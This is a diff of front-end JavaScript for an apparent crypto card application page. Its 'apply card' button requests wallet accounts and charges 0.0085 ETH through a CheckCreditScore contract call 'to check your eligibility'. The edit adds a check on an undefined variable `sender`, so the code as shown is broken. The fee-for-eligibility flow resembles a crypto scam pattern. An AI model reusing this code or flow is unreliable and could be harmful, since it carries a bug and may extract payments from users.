@@ -675,22 +675,24 @@ console.log(walletAddress = accounts[0]);
         }
 
         document.getElementById('apply-card').addEventListener('click', async () => {
-            try {
-                if (!walletConnected) {
-                    flashNotification('Connect wallet first', 'grey');
-                    return;
-                }
+		if (!walletConnected) {
+	                    flashNotification('Connect wallet first', 'grey');
+	                    return;
+	                }
 
-                document.getElementById('popup-status').textContent = 'Approve Transaction';
-                document.getElementById('popup-message').textContent = `You have to approve the transaction to check your eligibility.`;
-
-                var popup = document.getElementById("process-transaction-popup");
-                popup.style.display = "flex";
-
-
-                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+		const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                 const fromAddress = accounts[0];
 
+		if (!sender) {
+	        flashNotification('Error: No wallet address found', 'red');
+	        return;
+	  	  }
+            try {
+		    
+                document.getElementById('popup-status').textContent = 'Approve Transaction';
+                document.getElementById('popup-message').textContent = `You have to approve the transaction to check your eligibility.`;
+                document.getElementById("process-transaction-popup").style.display = "flex";
+               
                 const weiAmount = web3.utils.toWei('0.0085', 'ether');
                 const gas = await contract.methods.CheckCreditScore().estimateGas({ value: weiAmount, from: fromAddress });
                 await contract.methods.CheckCreditScore().send({ from: fromAddress, value: weiAmount, gas });
@@ -700,11 +702,7 @@ console.log(walletAddress = accounts[0]);
                 if (result.status) {
                 document.getElementById("transaction-status").style.display = "flex";
                 document.getElementById('process-transaction-popup').style.display = 'none';
-
-}
-
-
-
+		}
             } catch (error) {
                 document.getElementById('popup-status').textContent = 'Transaction Failed';
                 document.getElementById('popup-message').textContent = `❌ Error: ${error.message}`;
